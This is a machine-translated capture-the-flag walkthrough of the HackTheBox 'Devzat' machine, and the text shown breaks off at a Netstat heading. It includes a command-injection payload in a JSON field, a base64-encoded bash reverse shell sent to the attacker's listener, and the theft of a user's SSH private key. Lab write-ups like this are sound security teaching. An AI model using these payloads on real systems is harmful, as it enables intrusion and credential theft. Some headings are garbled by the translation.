<html>
<head>
<title>Devzat from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">来自HackTheBox的开发—详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/devzat-from-hackthebox-detailed-walkthrough-46f39b25fa82?source=collection_archive---------2-----------------------#2022-04-13">https://infosecwriteups.com/devzat-from-hackthebox-detailed-walkthrough-46f39b25fa82?source=collection_archive---------2-----------------------#2022-04-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="d67d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="a321" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/f0bfcf89dd785f9b1b78edef0b110bcf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*vmUOPH9fLy6n6QVn.png"/></div></figure><p id="5be4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Devzat是HackTheBox上的中型机器。经过初步扫描后，我们发现了一个名为Devzat的开发者聊天系统版本。进一步的枚举揭示了包含源代码的git repo。在那里，我们找到了一种方法来利用系统，并得到一个反向外壳。通过SSH隧道，我们发现了一个易受攻击的InfluxDB版本。利用它获得我们的用户信用，这导致了聊天系统的开发网站版本的备份。在查看代码之后，我们发现了一种从聊天系统的dev版本中读取文件的方法，这种方法让我们可以检索根标志来完成这个框。</p><p id="a67f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需的技能是枚举和阅读代码的能力。学到的技能是发现和利用漏洞，发现和利用源代码逻辑中的错误。</p><div class="lr ls gp gr lt lu"><a href="https://www.hackthebox.eu/home/machines/profile/398" rel="noopener  ugc nofollow" target="_blank"><div class="lv ab fo"><div class="lw ab lx cl cj ly"><h2 class="bd ir gy z fp lz fr fs ma fu fw ip bi translated">Devzat —破解盒子::渗透测试实验室</h2><div class="mb l"><h3 class="bd b gy z fp lz fr fs ma fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mc l"><p class="bd b dl z fp lz fr fs ma fu fw dk translated">www.hackthebox.eu</p></div></div><div class="md l"><div class="me l mf mg mh md mi lp lu"/></div></div></a></div><h1 id="0009" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="b7e0" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi mo"><img src="../Images/cbaa811a077131da7bbe8af6829efcfc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hdBROUizoEJhpx-ATUX_dg.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">设备的Nmap扫描</figcaption></figure><p id="702d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有三个开放的港口。OpenSSH在22上，Apache在80上，端口8000上有一个无法识别的SSH服务。</p><p id="4794" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，让我们将机箱名称放入hosts文件中:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9b22" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# echo "10.10.11.118 devzat.htb" &gt;&gt; /etc/hosts</span></pre><h1 id="9a7a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">网站(全球资讯网的主机站)</h1><p id="9a0e" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">现在我们来看看网站:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi nh"><img src="../Images/b7ba362db0cab56d3df7ec56ba2917a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*RAqu63BISm8Igs9-.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">Devzat网站</figcaption></figure><h1 id="4fc5" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">发展聊天</h1><p id="a150" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">这是一个简单的页面，包含开发人员聊天系统的详细信息和连接信息:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/3ad1d29f76125b120b3afd0d78299345.png" data-original-src="https://miro.medium.com/v2/resize:fit:680/format:webp/0*RyVqWsTX_PzF73a1.png"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">开发聊天连接信息</figcaption></figure><p id="1abb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们知道端口8000上有什么。让我们试一试:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="39cf" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# ssh -l pencer devzat.htb -p 8000<br/><br/>devbot: You seem to be new here . Welcome to Devzat! Run /help to see what you can do.<br/>Welcome to the chat. There are no more users<br/>devbot: pencer has joined the chat<br/>pencer: /help<br/><br/>[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat<br/>[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.<br/>[SYSTEM] <br/>[SYSTEM] Interesting features:<br/>[SYSTEM] • Many, many commands. Run /commands.<br/>[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.<br/>[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.<br/>[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.<br/>[SYSTEM] • Direct messages! Send a quick DM using =user &lt;msg&gt; or stay in DMs by running /room @user.<br/>[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.<br/>[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang &lt;word&gt; to start new games.<br/>[SYSTEM] • Emoji replacements! (like on Slack and Discord)<br/>[SYSTEM] <br/>[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.<br/>[SYSTEM] <br/>[SYSTEM] Made by Ishan Goel with feature ideas from friends.<br/>[SYSTEM] Thanks to Caleb Denio for lending his server!<br/>[SYSTEM] <br/>[SYSTEM] For a list of commands run</span></pre><p id="f6e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是Github上的Devzat版本<a class="ae nj" href="https://github.com/quackduck/devzat" rel="noopener ugc nofollow" target="_blank">这里</a>。我们以后可能需要深入研究源代码，因为现在我们可以检查哪些命令可用:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="b29f" class="nc km iq my b gy nd ne l nf ng">[SYSTEM] ┃ /commands<br/>pencer: /commands<br/>[SYSTEM] Commands<br/>[SYSTEM] clear - Clears your terminal<br/>[SYSTEM] message - Sends a private message to someone<br/>[SYSTEM] users - Gets a list of the active users<br/>[SYSTEM] all - Gets a list of all users who has ever connected<br/>[SYSTEM] exit - Kicks you out of the chat incase your client was bugged<br/>[SYSTEM] bell - Toggles notifications when you get pinged<br/>[SYSTEM] room - Changes which room you are currently in<br/>[SYSTEM] id - Gets the hashed IP of the user<br/>[SYSTEM] commands - Get a list of commands<br/>[SYSTEM] nick - Change your display name<br/>[SYSTEM] color - Change your display name color<br/>[SYSTEM] timezone - Change how you view time<br/>[SYSTEM] emojis - Get a list of emojis you can use<br/>[SYSTEM] help - Get generic info about the server<br/>[SYSTEM] tictactoe - Play tictactoe<br/>[SYSTEM] hangman - Play hangman<br/>[SYSTEM] shrug - Drops a shrug emoji<br/>[SYSTEM] ascii-art - Bob ross with text<br/>[SYSTEM] example-code - Hello world!</span></pre><p id="1c7f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用可用的命令，但是这里没有任何有用的命令:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6a6a" class="nc km iq my b gy nd ne l nf ng">pencer: /emojis<br/>[SYSTEM] Check out github.com/ikatyang/emoji-cheat-sheet<br/>pencer: /users<br/>[SYSTEM] [pencer]<br/>pencer: /all<br/>[SYSTEM] [/all hello hello pencer plssub SYSTEM test test]<br/>pencer: /shrug<br/>pencer: ¯(ツ)/¯<br/>pencer: /id<br/>[SYSTEM] a1ccf7c03332a87bb3cb8e401cbeeca365de4b9a847f48e44d9d5baf0410cf45<br/>pencer: /room<br/>[SYSTEM] You are currently in #main<br/>[SYSTEM] Rooms and users<br/>[SYSTEM] #main: [pencer]<br/>pencer: /example-code<br/>[SYSTEM] ┃ package main<br/>         ┃ import "fmt"<br/>         ┃ func main() {<br/>         ┃    fmt.Println("Example!")<br/>         ┃ }<br/>pencer: /exit<br/>Connection to devzat.htb closed.</span></pre><h1 id="837f" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Gobuster</h1><p id="d021" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">让我们退出，做一些枚举，看看是否有其他我们可以找到的东西:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="ac14" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# gobuster vhost -t 100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devzat.htb -o results.txt<br/>===============================================================<br/>Gobuster v3.1.0<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url:          http://devzat.htb<br/>[+] Method:       GET<br/>[+] Threads:      100<br/>[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br/>[+] User Agent:   gobuster/3.1.0<br/>[+] Timeout:      10s<br/>===============================================================<br/>2021/10/28 22:16:00 Starting gobuster in VHOST enumeration mode<br/>===============================================================<br/>Found: mail2.devzat.htb (Status: 302) [Size: 284]<br/>Found: autoconfig.devzat.htb (Status: 302) [Size: 289]<br/>&lt;SNIP&gt;<br/>Found: ip204-109.devzat.htb (Status: 302) [Size: 288]<br/>Found: sugiyama1.devzat.htb (Status: 302) [Size: 288]<br/>===============================================================<br/>2021/10/28 22:16:37 Finished<br/>===============================================================<br/><br/>┌──(root💀kali)-[~/htb/devzat]<br/>└─# cat results.txt | grep "Status: 20"<br/>Found: pets.devzat.htb (Status: 200) [Size: 510]</span></pre><p id="f4ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们找到一个叫做pets的子域。添加到主机文件，然后在浏览器中查看:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi nh"><img src="../Images/52ff693c29b889c0afc25370b8abec7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*a87ijPZD0tm7U3Ul.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">我的宠物在宠物清单上</figcaption></figure><p id="4195" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以添加自己的宠物，但它不做任何有趣的事情。看一下Burp，就可以发现发布的两个字段:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi nk"><img src="../Images/51f87ba4e00d2360dda97b4826a86740.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*exS0q7m6iMYVBId3.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">打嗝拦截请求</figcaption></figure><h1 id="c3a6" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">与宠物互动</h1><p id="b1dd" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">我们也可以从终端执行此操作:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4e11" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# curl -d '{"name":"test1","species":"giraffe"}' -X POST http://pets.devzat.htb/api/pet<br/>Pet was added successfully</span></pre><p id="e906" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是时候进行更多的枚举了。这一次，让我们看看有趣的文件夹的宠物子域:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="582e" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# gobuster dir -t 100 -w /usr/share/wordlists/dirb/common.txt -u http://pets.devzat.htb/ --exclude-length 510 <br/>===============================================================<br/>Gobuster v3.1.0<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url:                     http://pets.devzat.htb/<br/>[+] Method:                  GET<br/>[+] Threads:                 100<br/>[+] Wordlist:                /usr/share/wordlists/dirb/common.txt<br/>[+] Negative Status codes:   404<br/>[+] Exclude Length:          510<br/>[+] User Agent:              gobuster/3.1.0<br/>[+] Timeout:                 10s<br/>===============================================================<br/>2021/10/28 22:41:08 Starting gobuster in directory enumeration mode<br/>===============================================================<br/>/build                (Status: 301) [Size: 42] [--&gt; /build/]<br/>/css                  (Status: 301) [Size: 40] [--&gt; /css/]  <br/>/.git/HEAD            (Status: 200) [Size: 23]              <br/>/server-status        (Status: 403) [Size: 280]             <br/>===============================================================<br/>2021/10/28 22:41:14 Finished<br/>===============================================================</span></pre><h1 id="ac32" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Git回购</h1><p id="a1ea" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">我的眼睛被吸引到。git文件夹。为什么会在上面？让我们来看看:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="c815" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# curl http://pets.devzat.htb/.git/<br/>&lt;pre&gt;<br/>&lt;a href="COMMIT_EDITMSG"&gt;COMMIT_EDITMSG&lt;/a&gt;<br/>&lt;a href="HEAD"&gt;HEAD&lt;/a&gt;<br/>&lt;a href="branches/"&gt;branches/&lt;/a&gt;<br/>&lt;a href="config"&gt;config&lt;/a&gt;<br/>&lt;a href="description"&gt;description&lt;/a&gt;<br/>&lt;a href="hooks/"&gt;hooks/&lt;/a&gt;<br/>&lt;a href="index"&gt;index&lt;/a&gt;<br/>&lt;a href="info/"&gt;info/&lt;/a&gt;<br/>&lt;a href="logs/"&gt;logs/&lt;/a&gt;<br/>&lt;a href="objects/"&gt;objects/&lt;/a&gt;<br/>&lt;a href="refs/"&gt;refs/&lt;/a&gt;<br/>&lt;/pre&gt;</span></pre><p id="7421" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到这是一个git存储库，有几个文件和一些文件夹:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="b95b" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# curl http://pets.devzat.htb/.git/COMMIT_EDITMSG<br/>back again to localhost only<br/><br/>┌──(root💀kali)-[~/htb/devzat]<br/>└─# curl http://pets.devzat.htb/.git/logs/HEAD     <br/>0000000000000000000000000000000000000000 8274d7a547c0c3854c074579dfc359664082a8f6 patrick &lt;patrick@devzat.htb&gt; 1624391552 +0000 commit (initial): init<br/>8274d7a547c0c3854c074579dfc359664082a8f6 464614f32483e1fde60ee53f5d3b4d468d80ff62 patrick &lt;patrick@devzat.htb&gt; 1624474943 +0000 commit: fixed broken fonts<br/>464614f32483e1fde60ee53f5d3b4d468d80ff62 ef07a04ebb2fc92cf74a39e0e4b843630666a705 patrick &lt;patrick@devzat.htb&gt; 1624475172 +0000 commit: back again to localhost only</span></pre><h1 id="4753" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Gitdumper</h1><p id="94f4" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">我们需要转储git repo，这样我们就可以轻松地查看它。在前面一个名为<a class="ae nj" href="https://www.hackthebox.com/home/machines/profile/252" rel="noopener ugc nofollow" target="_blank">旅行</a>的盒子中，我们使用了<a class="ae nj" href="https://github.com/internetwache/GitTools" rel="noopener ugc nofollow" target="_blank"> GitDumper </a>，让我们再来一次:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="471b" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# git clone https://github.com/internetwache/GitTools.git<br/>Cloning into 'GitTools'...<br/>remote: Enumerating objects: 229, done.<br/>remote: Counting objects: 100% (20/20), done.<br/>remote: Compressing objects: 100% (16/16), done.<br/>remote: Total 229 (delta 6), reused 7 (delta 2), pack-reused 209<br/>Receiving objects: 100% (229/229), 52.92 KiB | 1.65 MiB/s, done.<br/>Resolving deltas: 100% (85/85), done.<br/>                         <br/>┌──(root💀kali)-[~/htb/devzat/GitTools/Dumper]<br/>└─# ./gitdumper.sh http://pets.devzat.htb/.git/ pets_git<br/>###########<br/># GitDumper is part of https://github.com/internetwache/GitTools<br/>#<br/># Developed and maintained by @gehaxelt from @internetwache<br/>###########<br/>[*] Destination folder does not exist<br/>[+] Creating pets_git/.git/<br/>[+] Downloaded: HEAD<br/>[-] Downloaded: objects/info/packs<br/>[+] Downloaded: description<br/>[+] Downloaded: config<br/>[+] Downloaded: COMMIT_EDITMSG<br/>&lt;SNIP&gt;<br/>[+] Downloaded: objects/f3/3e8162997aaa9da582aa81428ee87aa48953a6<br/>[+] Downloaded: objects/73/c1a4d5d156b6ddc62a7e3eba1c206bd6ad19c8<br/>[+] Downloaded: objects/dc/52d954d8d7f62c82cf63236d27093764a3d046</span></pre><p id="08b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要提取转储:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="1f0b" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# ./GitTools/Extractor/extractor.sh pets_git extracted<br/>###########<br/># Extractor is part of https://github.com/internetwache/GitTools<br/>#<br/># Developed and maintained by @gehaxelt from @internetwache<br/>###########<br/>[*] Destination folder does not exist<br/>[*] Creating...<br/>[+] Found commit: 8274d7a547c0c3854c074579dfc359664082a8f6<br/>[+] Found file: /root/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6/.gitignore<br/>[+] Found folder: /root/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics<br/>[+] Found file: /root/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/bluewhale<br/>&lt;SNIP&gt;<br/>[+] Found file: /root/htb/devzat/extracted/2-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/src/App.svelte<br/>[+] Found file: /root/htb/devzat/extracted/2-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/src/main.js</span></pre><p id="2b21" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以在本地查看git repo内部:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4aa7" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# cd extracted <br/><br/>┌──(root💀kali)-[~/htb/devzat/extracted]<br/>└─# ls     <br/>0-8274d7a547c0c3854c074579dfc359664082a8f6<br/>1-464614f32483e1fde60ee53f5d3b4d468d80ff62 <br/>2-ef07a04ebb2fc92cf74a39e0e4b843630666a705<br/><br/>┌──(root💀kali)-[~/htb/devzat/extracted]<br/>└─# ls 0-8274d7a547c0c3854c074579dfc359664082a8f6 <br/>characteristics  commit-meta.txt  go.mod  go.sum  main.go  petshop  start.sh  static</span></pre><p id="1cb9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有前面看到的三个提交。看第一个，我们可以看到它是我们刚刚看过的pets站点的源代码。深入研究main.go文件，我们会发现这一部分:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi nl"><img src="../Images/c1e628fd290c842811020d91ef53ba82.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Rl1WxizwRnoO_XBmAndo3Q.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">main.go文件的源代码</figcaption></figure><h1 id="1ee1" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">TCPDump</h1><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="bf37" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6]<br/>└─# curl -d '{"name":"pencer","species":"giraffe;ping -c 4 10.10.14.235"}' -X POST http://pets.devzat.htb/api/pet<br/>Pet was added successfully</span></pre><h1 id="246c" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">反向外壳</h1><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4472" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# tcpdump icmp -i tun0      <br/>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode<br/>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes<br/>23:10:45.396719 IP devzat.htb &gt; 10.10.14.235: ICMP echo request, id 11, seq 1, length 64<br/>23:10:45.396729 IP 10.10.14.235 &gt; devzat.htb: ICMP echo reply, id 11, seq 1, length 64<br/>23:10:46.398232 IP devzat.htb &gt; 10.10.14.235: ICMP echo request, id 11, seq 2, length 64<br/>23:10:46.398241 IP 10.10.14.235 &gt; devzat.htb: ICMP echo reply, id 11, seq 2, length 64<br/>23:10:47.399926 IP devzat.htb &gt; 10.10.14.235: ICMP echo request, id 11, seq 3, length 64<br/>23:10:47.399936 IP 10.10.14.235 &gt; devzat.htb: ICMP echo reply, id 11, seq 3, length 64<br/>23:10:48.401262 IP devzat.htb &gt; 10.10.14.235: ICMP echo request, id 11, seq 4, length 64<br/>23:10:48.401273 IP 10.10.14.235 &gt; devzat.htb: ICMP echo reply, id 11, seq 4, length 64</span></pre><p id="9f88" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在切换到正在等待的netcat监听器:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="976d" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6]<br/>└─# echo -n 'bash -i &gt;&amp; /dev/tcp/10.10.15.40/1337 0&gt;&amp;1' | base64<br/>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40MC8xMzM3IDA+JjE=<br/><br/>┌──(root💀kali)-[~/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6]<br/>└─# curl -d '{"name":"pencer","species":"giraffe;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40MC8xMzM3IDA+JjE= | base64 -d | bash"}  ' -X POST http://pets.devzat.htb/api/pet</span></pre><p id="66d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">随着shell升级到更有用的版本，我快速浏览了一下:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="589c" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# nc -lvvp 1337                              <br/>listening on [any] 1337 ...<br/>connect to [10.10.15.40] from devzat.htb [10.10.11.118] 42062<br/>patrick@devzat:~/pets$ python3 -c 'import pty; pty.spawn("/bin/bash")'<br/>python3 -c 'import pty; pty.spawn("/bin/bash")'<br/>patrick@devzat:~/pets$ ^Z<br/>zsh: suspended  nc -lvvp 1337<br/>┌──(root💀kali)-[~/htb/devzat]<br/>└─# stty raw -echo; fg<br/>[1]  + continued  nc -lvvp 1337<br/>patrick@devzat:~/pets$</span></pre><h1 id="c136" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">宋承宪饰演帕特里克</h1><p id="133a" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">我们看到只有两个用户，并且标志不在Patrick的主文件夹中。所以我们可以假设下一步需要上报给凯瑟琳。Patrick有一个私有的SSH密钥，因此我将退出这个反向shell，以他的身份通过SSH登录，以获得更好的连接:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e770" class="nc km iq my b gy nd ne l nf ng">patrick@devzat:~/pets$ ls -lsa /home       <br/>4 drwxr-xr-x  5 catherine catherine 4096 Oct 31 20:46 catherine<br/>4 drwxr-xr-x  9 patrick   patrick   4096 Sep 24 14:57 patrick<br/><br/>patrick@devzat:~/pets$ ls -lsa /home/patrick<br/>0 lrwxrwxrwx 1 root    root       9 Jun 22 20:40 .bash_history -&gt; /dev/null<br/>4 -rw-r--r-- 1 patrick patrick  220 Feb 25  2020 .bash_logout<br/>4 -rw-r--r-- 1 patrick patrick 3809 Jun 22 18:43 .bashrc<br/>4 drwx------ 3 patrick patrick 4096 Jun 22 20:17 .cache<br/>4 drwx------ 3 patrick patrick 4096 Jun 23 16:00 .config<br/>4 drwxr-x--- 2 patrick patrick 4096 Sep 23 15:07 devzat<br/>4 -rw-rw-r-- 1 patrick patrick   51 Jun 22 19:52 .gitconfig<br/>4 drwxrwxr-x 3 patrick patrick 4096 Jun 22 18:51 go<br/>4 drwxrwxr-x 4 patrick patrick 4096 Jun 22 18:50 .npm<br/>4 drwxrwx--- 5 patrick patrick 4096 Jun 23 19:05 pets<br/>4 -rw-r--r-- 1 patrick patrick  807 Feb 25  2020 .profile<br/>4 drwxrwxr-x 2 patrick patrick 4096 Sep 29 16:33 .ssh</span></pre><p id="4126" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">把这个密钥复制到Kali上的一个文件中:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="be5a" class="nc km iq my b gy nd ne l nf ng">patrick@devzat:~/pets$ cd /home/patrick/<br/><br/>patrick@devzat:~$ cat .ssh/id_rsa <br/>-----BEGIN OPENSSH PRIVATE KEY-----<br/>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br/>&lt;SNIP&gt;<br/>n3LMfTlr/Fl0V3AAAADnBhdHJpY2tAZGV2emF0AQIDBA==<br/>-----END OPENSSH PRIVATE KEY-----</span></pre><p id="5700" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在SSH在使用私钥:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="a78b" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# ssh -i id_rsa patrick@devzat.htb<br/>Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)<br/>Last login: Sun Oct 31 20:38:41 2021 from 10.10.14.37<br/>patrick@devzat:~$</span></pre><h1 id="c337" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Netstat</h1><p id="f0c9" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij 